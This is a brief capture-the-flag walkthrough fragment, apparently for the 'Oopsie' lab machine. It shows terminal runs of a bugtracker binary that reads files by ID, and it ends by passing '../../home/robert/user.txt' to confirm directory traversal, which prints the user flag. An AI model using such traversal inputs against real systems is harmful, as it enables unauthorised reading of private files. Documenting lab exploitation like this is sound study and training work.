## Executing with 'expected' input
```
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.

```

## Executing with unexpected output
```
robert@oopsie:~$ /usr/bin/bugtracker                                         
                                                                             
------------------                                                           
: EV Bug Tracker :                                                           
------------------

Provide Bug ID: DOesNotExist
---------------

cat: /root/reports/DOesNotExist: No such file or directory

```

## Confirming directory traversal
```
robert@oopsie:~$ /usr/bin/bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../../home/robert/user.txt
---------------

f2c74ee8db7983851ab2a96a44eb7981

*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)

```